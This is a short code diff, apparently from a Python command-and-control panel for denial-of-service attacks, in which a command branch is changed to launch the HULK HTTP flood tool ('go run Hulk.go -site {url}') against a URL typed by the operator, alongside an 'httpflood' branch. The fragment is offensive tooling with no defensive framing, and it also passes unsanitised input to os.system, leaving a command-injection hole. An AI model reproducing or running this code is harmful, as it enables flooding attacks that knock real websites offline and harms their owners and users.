@@ -528,10 +528,10 @@ def main():
             try:
                 url = cnc.split()[1]
                 method = cnc.split()[2]
-                os.system(f'Attack Sending to : {url} Method : {method}')
+                os.system(f'go run Hulk.go -site {url} -data {method}')
             except IndexError:
-                print('Usage: crash <url> METHODS<GET/POST>')
-                print('Example: crash http://example.com GET')
+                print('Usage: tls <url> METHODS<GET/POST>')
+                print('Example: tls http://example.com GET')
 
         elif "httpflood" in cnc:
             try:
